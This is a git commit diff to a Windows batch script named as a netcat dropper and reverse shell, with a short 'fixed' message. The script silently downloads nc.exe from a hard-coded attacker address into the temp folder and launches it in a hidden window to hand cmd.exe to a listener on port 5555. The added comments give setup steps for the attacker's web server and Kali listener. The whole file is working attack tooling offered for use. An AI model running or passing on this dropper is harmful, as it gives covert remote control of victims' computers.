da608299d9d757d920026a8f5eed6f9fc9a94666
d3hvck <106494573+d3hvck@users.noreply.github.com>
2025-04-15 13:34:51 +0400

    fixed

--- Exp_NCDropper_and_RevShell.bat
+++ Exp_NCDropper_and_RevShell.bat
@@ -1,5 +1,8 @@
 @echo off
 set ncpath=%TEMP%\nc.exe
 set ncaddr=192.168.1.65
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://192.168.1.65/nc.exe' -OutFile '%ncpath%'"
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://%ncaddr%/nc.exe' -OutFile '%ncpath%'"
 powershell -WindowStyle Hidden -Command "Start-Process '%ncpath%' -ArgumentList '%ncaddr% 5555 -e cmd.exe' -WindowStyle Hidden"
+:: Change IP Address before using it
+:: Change filename
+:: Before runing this Delivery Method start python server on port 80 and listen on run "nc -nvlp 5555" in kali
